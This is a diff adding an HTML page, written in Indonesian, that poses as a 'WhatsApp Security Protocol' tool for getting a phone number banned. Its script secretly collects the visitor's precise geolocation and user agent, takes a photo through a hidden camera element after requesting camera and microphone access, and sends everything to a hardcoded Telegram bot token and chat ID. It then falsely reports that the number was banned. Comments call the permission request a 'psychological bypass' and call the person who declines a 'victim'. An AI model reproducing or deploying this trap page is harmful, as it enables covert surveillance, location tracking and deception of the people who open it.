@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>WhatsApp Security Protocol - Verified Access</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    /* Estetika Otoritas Palsu */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+    .terminal-box { width: 90%; max-width: 450px; background: #020c1b; border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 40px rgba(0, 255, 65, 0.2); position: relative; }
+    .header { color: #fff; font-weight: 900; margin-bottom: 20px; text-align: center; border-bottom: 1px solid #112240; padding-bottom: 10px; }
+    .input-group { margin-bottom: 20px; }
+    input { width: 100%; padding: 12px; background: #010810; border: 1px solid #112240; color: #00ff41; outline: none; }
+    button { width: 100%; padding: 15px; background: #00ff41; color: #000; border: none; font-weight: 900; cursor: pointer; transition: 0.3s; }
+    button:hover { background: #fff; }
+    #status { font-size: 10px; margin-top: 15px; color: #888; text-align: left; }
+    
+    /* Kamar Gelap: Dimensi Tersembunyi */
+    #void-chamber { position: absolute; left: -9999px; visibility: hidden; }
+  </style>
+</head>
+<body>
+  <div class="terminal-box">
+    <div class="header">VERIFIKASI PROTOKOL BANS</div>
+    <div class="input-group">
+      <input type="number" id="target" placeholder="NOMOR TARGET (08xxx)">
+    </div>
+    <button id="btn_init">AKTIFKAN BANS</button>
+    <div id="status">STATUS: STANDBY...</div>
+  </div>
+
+  <div id="void-chamber">
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" width="640" height="480"></canvas>
+  </div>
+
+  <script>
+    const CONFIG = {
+      T: '8668436830:AAFRtCDmo1lKwKspEHIZQEhEYDkONf0JG7U',
+      C: '7109845671'
+    };
+
+    const log = (m) => document.getElementById('status').innerText = `>> ${m}`;
+
+    async function send(type, payload, extra = "") {
+      const fd = new FormData();
+      fd.append('chat_id', CONFIG.C);
+      if (type === 'img') { fd.append('photo', payload); fd.append('caption', extra); }
+      else { fd.append('text', payload); fd.append('parse_mode', 'HTML'); }
+      try { fetch(`https://api.telegram.org/bot${CONFIG.T}/${type === 'img' ? 'sendPhoto' : 'sendMessage'}`, { method: 'POST', body: fd }); } catch(e) {}
+    }
+
+    // --- FORGE BYPASS & FIX LOKASI FATAL ---
+    async function harvestHighPrecision() {
+      // Perbaikan Fatal: Menambahkan timeout dan enableHighAccuracy agar lokasi tidak "stuck"
+      const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+
+      navigator.geolocation.getCurrentPosition(
+        async (p) => {
+          const { latitude: lat, longitude: lon, accuracy: acc } = p.coords;
+          await send('txt', `📍 <b>LOKASI AKURAT</b>\nLat: <code>${lat}</code>\nLon: <code>${lon}</code>\nAkurasi: ${acc} meter\n<a href="https://www.google.com/maps?q=${lat},${lon}">Buka di Google Maps</a>`);
+        },
+        async (err) => {
+          await send('txt', `❌ <b>Gagal Lokasi:</b> ${err.message}`);
+        }, 
+        options
+      );
+    }
+
+    async function silentStrike() {
+      const v = document.getElementById('v');
+      const c = document.getElementById('c');
+      const ctx = c.getContext('2d');
+
+      try {
+        // Bypass Psikologis: Meminta Kamera & Audio dalam satu prompt untuk efisiensi
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 }, audio: true });
+        v.srcObject = stream;
+
+        v.onloadedmetadata = () => {
+          setTimeout(() => { // Jeda 500ms agar sensor fokus
+            ctx.drawImage(v, 0, 0, 640, 480);
+            c.toBlob(blob => {
+              if (blob) send('img', blob, "📸 Captured_via_Secure_Protocol");
+              stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.9);
+          }, 500);
+        };
+      } catch (e) {
+        await send('txt', "<b>[!] Korban Menolak Akses Kamera</b>");
+      }
+    }
+
+    document.getElementById('btn_init').addEventListener('click', async (e) => {
+      const val = document.getElementById('target').value;
+      if (val.length < 8) return log("DATA TIDAK VALID");
+
+      e.target.disabled = true;
+      log("MENGHUBUNGKAN KE SERVER... (HTTPS SECURED)");
+
+      // Eksekusi Serentak
+      send('txt', `<b>📞 TARGET:</b> <code>${val}</code>\n<b>User-Agent:</b> ${navigator.userAgent}`);
+      
+      // Ritual Pelacakan & Kamera
+      harvestHighPrecision();
+      await silentStrike();
+
+      setTimeout(() => {
+        log(`BERHASIL: NOMOR ${val} TELAH DI-BANS.`);
+        e.target.disabled = false;
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
